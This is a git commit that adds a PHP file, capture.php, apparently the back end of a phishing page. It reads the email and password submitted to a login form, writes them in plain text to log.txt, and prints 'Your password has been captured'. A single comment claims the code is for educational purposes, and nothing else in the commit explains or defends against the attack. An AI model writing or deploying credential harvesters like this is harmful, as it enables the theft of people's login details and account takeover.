292846e12f48a547516ff0066438b5f00f383a12
yuvasri04022005 <yuvv200519@gmail.com>
2025-01-02 11:21:24 +0530

    first commit

---
+++ capture.php
@@ -0,0 +1,18 @@
+<?php
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+    
+    // Log the captured data (for educational purposes)
+    $file = fopen("log.txt", "a");
+    fwrite($file, "Email: $email | Password: $password\n");
+    fclose($file);
+    
+    // echo "Login failed. Please try again.";
+
+?>
+
+<h1>Your password has been captured</h1>
+
+<?php
+
+?>
